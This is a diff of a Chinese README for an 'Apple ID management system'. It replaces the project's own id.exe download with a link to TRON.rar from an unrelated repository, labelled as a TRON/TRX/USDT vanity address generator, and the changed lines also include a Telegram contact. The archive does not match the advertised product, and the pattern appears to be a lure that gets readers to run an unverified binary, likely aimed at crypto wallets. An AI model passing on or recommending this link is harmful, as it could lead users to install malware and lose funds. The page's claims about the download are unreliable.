@@ -23,6 +23,6 @@ Apple ID 管理系统
 
 下载链接：
 
-https://github.com/Daniel-Wu-1/Apple-ID-management-system/releases/download/%E8%8B%B9%E6%9E%9Cid%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/id.exe
+**点击[[TRON.rar]](https://github.com/Daniel-Wu-1/tron_vanity/releases/download/TRON%2FTRX%2FUSDT%E9%9D%93%E5%8F%B7%E7%94%9F%E6%88%90V1.0/TRON.rar)下载**
 
 联系飞机telegram：[@jiutong9999](https://t.me/jiutong9999)
